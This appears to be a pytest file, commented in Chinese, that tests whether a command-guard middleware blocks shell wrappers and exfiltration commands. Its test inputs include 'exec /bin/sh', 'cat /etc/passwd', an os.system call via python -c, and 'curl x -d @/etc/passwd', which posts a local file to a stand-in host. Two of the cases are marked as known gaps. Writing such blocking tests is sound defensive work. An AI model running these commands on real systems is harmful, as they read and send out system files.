# -*- coding: utf-8 -*-

"""RCE 包装器 / 命令注入硬化测试

断言 `_is_blocked` 拦截常见 RCE 包装器与 exfil 向量:
  - bash -c / sh -c                (任意命令执行包装)
  - exec / source                  (直接拉起 shell / 载入脚本)
  - python -c 内含危险调用          (RCE-prone token: os.system 等)
  - curl -d @/etc/passwd           (通过 @ 读取并外发本地文件, path exfil)

其中 `python -c "import os; os.system('id')"` 与 `curl -d @/etc/passwd`
当前代码尚未覆盖 (攻击审查标记), 用 `pytest.mark.xfail` 标注为待修复项;
当前若 FAIL 表示 fix agent 尚未落地, 属预期。其余用例当前即通过, 固化既有防护。
"""

import pytest

from middleware.command_guard import CommandGuardMiddleware


def _guard() -> CommandGuardMiddleware:
    return CommandGuardMiddleware()  # 默认 blocklist + enabled


def test_bash_c_blocked():
    assert _guard()._is_blocked("bash -c '...'") is True


def test_sh_c_blocked():
    assert _guard()._is_blocked("sh -c 'cat /etc/passwd'") is True


def test_exec_blocked():
    assert _guard()._is_blocked("exec /bin/sh") is True


def test_source_blocked():
    assert _guard()._is_blocked("source /etc/passwd") is True


@pytest.mark.xfail(
    reason="python -c 内含 os.system 等 RCE token 尚未专门拦截 (攻击审查盲点); 断言修复后安全结果",
    strict=False,
)
def test_python_c_rce_token_blocked():
    assert _guard()._is_blocked("python -c \"import os; os.system('id')\"") is True


@pytest.mark.xfail(
    reason="curl -d @/path 读取并外发本地文件 (path exfil) 尚未拦截 (攻击审查盲点); 断言修复后安全结果",
    strict=False,
)
def test_curl_at_exfil_blocked():
    assert _guard()._is_blocked("curl x -d @/etc/passwd") is True


def test_benign_python_c_allowed():
    # 良性内联脚本不应被误拦
    assert _guard()._is_blocked('python -c "print(1)"') is False
